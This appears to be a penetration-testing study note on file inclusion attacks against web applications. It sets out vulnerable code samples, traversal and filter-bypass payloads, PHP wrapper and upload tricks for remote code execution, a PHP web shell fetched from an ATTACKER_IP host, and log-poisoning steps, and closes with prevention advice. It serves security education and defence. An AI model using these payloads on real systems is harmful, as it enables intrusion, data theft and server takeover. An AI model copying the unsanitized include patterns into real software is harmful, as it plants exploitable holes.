# File Inclusion

## Intro to File Inclusions

Unsanitized file-path parameters let attackers include arbitrary local files: source code disclosure, sensitive data exposure, and under certain conditions RCE.

### Local File Inclusion (LFI)

Found most often in templating engines: static header/footer loads normally, dynamic content loads from a file named by a parameter (`/index.php?page=about` pulls `about.php`).

### Examples of Vulnerable Code

#### PHP

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

#### NodeJS

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

#### Java

```text
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

```text
<c:import url= "<%= request.getParameter('language') %>"/>
```

#### .NET

```text
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

```text
@Html.Partial(HttpContext.Request.Query['language'])
```

```text
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

### Read vs Execute

Some inclusion functions only read file content, others also execute it. Execute-capable functions can lead to RCE; read-only ones still leak source/credentials.

PHP: `include()`/`include_once()` read, execute, remote | `require()`/`require_once()` read, execute | `file_get_contents()` read, remote | `fopen()`/`file()` read

NodeJS: `fs.readFile()` read | `fs.sendFile()` read | `res.render()` read, execute

Java: `include` read | `import` read, execute, remote

.NET: `@Html.Partial()` read | `@Html.RemotePartial()` read, remote | `Response.WriteFile()` read | `include` read, execute, remote

## Local File Inclusion (LFI)

Exploiting LFI to read local files via path manipulation, traversal, and bypassing prefixes or appended extensions.

### Basic LFI

Common readable targets to confirm LFI: `/etc/passwd` Linux | `C:\Windows\boot.ini` Windows

```http
http://<TARGET_IP>:<PORT>/index.php?language=/etc/passwd
```

### Path Traversal

```php
include("./languages/" . $_GET['language']);
```

A prefixed directory breaks absolute-path payloads. Bypass by traversing with `../` repeatedly up to root.

```http
http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

Extra `../` past root is harmless, so when unsure of depth add many. For efficiency, calculate the exact depth from the doc root instead.

### Filename Prefix

```php
include("lang_" . $_GET['language']);
```

Bypass by prefixing the payload with `/` so the prefix string becomes a directory component.

```http
http://<TARGET_IP>:<PORT>/index.php?language=/../../../etc/passwd
```

Fails if the prefix directory does not actually exist. Can also break wrapper/RFI payloads that need the prefix untouched.

### Appended Extensions

```php
include($_GET['language'] . ".php");
```

Restricts inclusion to `.php` files. Bypasses covered in Basic Bypasses.

### Second-Order Attacks

LFI payload stored indirectly (e.g. a username) and triggered later when another function pulls a file based on that stored value (e.g. `/profile/<USERNAME>/avatar.png`).

Works with any LFI, regardless of language/framework. Look for functions that pull files based on an indirectly controlled, stored value (database-backed).

## Basic Bypasses

Techniques to bypass LFI filters: non-recursive traversal filters, character encoding, approved-path checks, and appended extensions.

### Non-Recursive Path Traversal Filters

```php
$language = str_replace('../', '', $_GET['language']);
```

The filter runs once, not recursively, so nested traversal sequences still resolve after stripping.

```http
http://<TARGET_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

Other recursive variants: `....//` | `..././` | `..../` | `....////`

### Encoding

URL-encode traversal characters to bypass filters blocking literal `.`/`/`. Decodes back to the traversal string before reaching the vulnerable function.

```http
http://<TARGET_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Encode every character, including dots, since some encoders skip dots as part of the URL scheme. Double-encode (encode the already-encoded string) to bypass extra filter layers. Core PHP filters on `<=5.3.4` were specifically vulnerable; custom filters on newer versions may still be bypassable.

### Approved Paths

```php
if(preg_match('/^\./languages/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Bypass by prefixing the payload with the approved path, then traversing out with `../`.

```http
http://<TARGET_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

Combine with encoding or the recursive-filter bypass if the approved-path check is layered with another filter.

### Appended Extension

Modern PHP (>=5.3/5.4) blocks the bypasses below; inclusion stays restricted to the given extension. Both techniques only work on PHP before 5.3/5.4.

#### Path Truncation

Old PHP strings truncate at 4096 chars; trailing slashes, single dots (`/.`), and repeated slashes get stripped/collapsed. A long enough path truncates the appended extension. Payload must start with a non-existing directory for this to work.

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

More `../` can be added safely (still resolves to root). Verify total length so only the extension truncates, not the target path.

#### Null Bytes

Condition: PHP `<5.5`. Append `%00` to terminate the string before the appended extension.

```text
/etc/passwd%00
```

## PHP Filters

PHP stream wrappers (`php://`) let LFI reach beyond reading files: apply filters, read source as base64, or extend to RCE.

### Input Filters

`php://filter/` applies a filter to a resource: `resource` picks the stream (file), `read` picks the filter. Useful filter: `convert.base64-encode` (Conversion Filters).

### Fuzzing for PHP Files

```bash
ffuf -w directory-list-2.3-small.txt:FUZZ -u http://<TARGET_IP>:<PORT>/FUZZ.php
```

Scan for all status codes, not just 200. LFI reads files regardless of normal HTTP access control, so `301`/`302`/`403` pages are still readable.

### Standard PHP Inclusion

Included `.php` files execute and render as HTML. Files with no HTML output (e.g. config files) return empty — a signal to switch to the base64 filter for source disclosure.

### Source Code Disclosure

```http
http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=<FILE>
```

Leave off the target's own extension, it gets appended automatically by the vulnerable code.

```bash
echo '<BASE64_STRING>' | base64 -d
```

Copy the full base64 string (check page source) or decoding fails.

## PHP Wrappers

Wrappers extend LFI past reading files to RCE: `data`, `input`, and `expect` wrappers execute attacker-supplied code directly.

### Data

Includes external data, including PHP code. Requires `allow_url_include = On`.

#### Checking PHP Configurations

Paths: `/etc/php/X.Y/apache2/php.ini` Apache | `/etc/php/X.Y/fpm/php.ini` Nginx

```bash
curl "http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/<PHP_VERSION>/apache2/php.ini"
```

```bash
echo '<BASE64_STRING>' | base64 -d | grep allow_url_include
```

#### Remote Code Execution

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```http
http://<TARGET_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_PAYLOAD>&cmd=<COMMAND>
```

### Input

Same idea as `data`, but the payload is sent as POST body. The vulnerable parameter must accept POST, and `allow_url_include` must be on.

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<TARGET_IP>:<PORT>/index.php?language=php://input&cmd=<COMMAND>"
```

Passing `cmd` as GET needs the function to accept `$_REQUEST`/GET too. Otherwise hardcode the command in the POSTed PHP instead of a dynamic web shell.

### Expect

Runs commands directly through the URL stream, no web shell needed. External wrapper, must be manually installed/enabled. `extension=expect` in php.ini only confirms it's configured, not that it loads.

```bash
curl -s "http://<TARGET_IP>:<PORT>/index.php?language=expect://<COMMAND>"
```

## Remote File Inclusion (RFI)

LFI-vulnerable functions that also accept remote URLs: enables SSRF and RCE by including an attacker-hosted script.

### Local vs. Remote File Inclusion

An LFI is not always an RFI:

- vulnerable function may not allow remote URLs
- only part of the filename is controlled, not the protocol wrapper (`http://`, `ftp://`, etc.)
- server config may disable RFI (off by default on most modern servers)

### Verify RFI

Checking `allow_url_include` alone is unreliable. Confirm by including a local URL first to avoid false negatives from firewalling.

```http
http://<TARGET_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

Don't include the vulnerable page itself, causes a recursive inclusion loop / DoS.

### Remote Code Execution with RFI

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Host on a common port (80/443), more likely whitelisted by outbound firewalls.

#### HTTP

```bash
sudo python3 -m http.server <LISTENING_PORT>
```

```http
http://<TARGET_IP>:<PORT>/index.php?language=http://<ATTACKER_IP>:<LISTENING_PORT>/shell.php&cmd=<COMMAND>
```

Check the connection log for an unexpected appended extension and drop it from the payload if seen.

#### FTP

```bash
sudo python -m pyftpdlib -p 21
```

```http
http://<TARGET_IP>:<PORT>/index.php?language=ftp://<ATTACKER_IP>/shell.php&cmd=<COMMAND>
```

```http
http://<TARGET_IP>:<PORT>/index.php?language=ftp://<USERNAME>:<PASSWORD>@<ATTACKER_IP>/shell.php&cmd=<COMMAND>
```

Default is anonymous auth. Useful if HTTP ports or the `http://` string are blocked.

#### SMB

Works on Windows targets without `allow_url_include`, since Windows treats SMB UNC paths as local files.

```bash
impacket-smbserver -smb2support share $(pwd)
```

```http
http://<TARGET_IP>:<PORT>/index.php?language=\\<ATTACKER_IP>\share\shell.php&cmd=<COMMAND>
```

Most reliable on the same network; SMB over the internet is often blocked.

## LFI and File Uploads

File upload + LFI with execute privileges = RCE regardless of extension/type, since included code executes once pulled in.

### Image upload

#### Crafting Malicious Image

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

`GIF8` magic bytes used since they're plain ASCII. Works with any allowed image/file type whose magic bytes pass the upload check.

#### Uploaded File Path

Find the uploaded path from the page source (e.g. `<img src="...">`) or fuzz an uploads directory if hidden.

```http
http://<TARGET_IP>:<PORT>/index.php?language=<UPLOAD_PATH>/shell.gif&cmd=<COMMAND>
```

If the LFI prefixes a directory, traverse out with `../` first before using the uploaded file's URL path.

### Zip Upload

Fallback if the direct method fails. `zip://` wrapper isn't enabled by default.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```http
http://<TARGET_IP>:<PORT>/index.php?language=zip://<UPLOAD_PATH>/shell.jpg%23shell.php&cmd=<COMMAND>
```

Some upload forms detect the zip by content-type despite the `.jpg` name.

### Phar Upload

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```http
http://<TARGET_IP>:<PORT>/index.php?language=phar://<UPLOAD_PATH>/shell.jpg%2Fshell.txt&cmd=<COMMAND>
```

Direct image-shell inclusion (above) is the most reliable; zip/phar are alternates if it fails.

## Log Poisoning

Write PHP code into a field that gets logged, then include that log through LFI to execute it. Requires read access to the log.

### PHP Session Poisoning

Paths: `/var/lib/php/sessions/sess_<SESSION_ID>` Linux | `C:\Windows\Temp\` Windows

Session filename is `sess_` plus the `PHPSESSID` cookie value. Check the session file for a field you control (e.g. one set by a GET/POST parameter), then poison it with a URL-encoded web shell:

```http
http://<TARGET_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

```http
http://<TARGET_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<SESSION_ID>&cmd=<COMMAND>
```

The session file gets overwritten after inclusion (controlled field resets), so re-poison before every command, or drop a persistent/reverse shell on the first hit.

### Server Log Poisoning

Paths: Apache `/var/log/apache2/` Linux, `C:\xampp\apache\logs\` Windows | Nginx `/var/log/nginx/` Linux, `C:\nginx\log\` Windows

Nginx logs are usually readable by low-privileged users by default; Apache logs usually need root/adm, except on older or misconfigured servers.

```http
http://<TARGET_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

Poison via `User-Agent`:

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<TARGET_IP>:<PORT>/index.php" -H @Poison
```

```http
http://<TARGET_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=<COMMAND>
```

Logs can be huge, inclusion may be slow or crash the server, send requests sparingly. `User-Agent` also appears in `/proc/self/environ` or `/proc/self/fd/<N>` (N usually 0-50), an alternate target if log read access is missing (often still needs privilege).

Other pollutable logs: `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log` — poison via a field the service logs (e.g. SSH/FTP username, email) if the service is exposed and its log is readable.

## Automated Scanning

Fuzzing and LFI tools can quickly find trivial LFI vulnerabilities and bypasses, saving time over fully manual testing.

### Fuzzing Parameters

```bash
ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?FUZZ=value' -fs <SIZE>
```

Unlinked/undocumented parameters tend to be less secured than ones tied to visible forms.

### LFI wordlists

Wordlist: `LFI-Jhaddix.txt` — contains various bypasses and common files.

```bash
ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=FUZZ' -fs <SIZE>
```

Manually verify any hits. A quick test, not a replacement for manual testing.

### Fuzzing Server Files

#### Server Webroot

```bash
ffuf -w default-web-root-directory-linux.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs <SIZE>
```

Useful when the uploads directory can't be reached relatively. Resolves the absolute webroot path for absolute-path payloads.

#### Server Logs/Configurations

Wordlist: `./LFI-WordList-Linux` (download separately, not part of seclists)

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs <SIZE>
```

```bash
curl http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

Log path may use an env var (e.g. `APACHE_LOG_DIR`) resolved in a separate file:

```bash
curl http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

### LFI Tools

Tools: `LFISuite`, `LFiFreak`, `liffy`

Most are unmaintained and rely on Python 2, reliability varies.

## File Inclusion Prevention

Patch LFI by never passing user input into inclusion functions, or restrict it to a whitelist mapping input to allowed files (DB table, case-match script, or static JSON map).

### Preventing Directory Traversal

Directory traversal can let attackers:

- read `/etc/passwd`: SSH keys, valid usernames for a password spray
- find other local services (e.g. Tomcat) and read `tomcat-users.xml`
- discover valid PHP session cookies, session hijacking
- read the web app's config and source code

Use the framework's own filename-only function (e.g. PHP `basename()`); downside is it can't enter subdirectories. Custom traversal filters can miss edge cases — bash treats `?`/`*` as `.` for traversal, PHP does not, so piping into `system()` can reopen the bypass.

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

### Web Server Configuration

`allow_url_fopen` Off | `allow_url_include` Off — disables remote file inclusion (PHP)

Restrict the app to its webroot (Docker, or PHP `open_basedir = /var/www` in php.ini). Disable dangerous modules: PHP Expect, mod_userdir.

### Web Application Firewall (WAF)

E.g. ModSecurity. Permissive mode reports without blocking, letting defenders tune rules before enabling blocking mode; it's an early warning sign even unblocked.

Hardening buys detection time, not invulnerability. Keep testing and watching logs, especially after a zero-day lands for a related framework.